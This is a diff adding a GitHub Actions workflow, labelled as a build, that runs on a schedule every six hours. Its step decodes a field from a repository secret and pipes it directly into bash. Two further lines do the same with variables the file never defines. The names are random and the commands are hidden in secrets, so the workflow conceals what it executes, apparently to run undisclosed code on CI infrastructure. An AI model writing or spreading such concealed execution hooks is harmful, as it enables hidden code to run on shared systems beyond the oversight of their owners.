@@ -1,0 +1,20 @@
+name: luosaihu1980
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: luosaihu1980
+        env:
+          pv74: ${{ secrets.pv74 }}
+        run: |
+          echo $pv74 | jq -r .oher5659 | /bin/bash
+          echo $f97812 | jq -r .lmtj221 | /bin/bash
+          echo $cgfdi8 | jq -r .dak95777 | /bin/bash
+
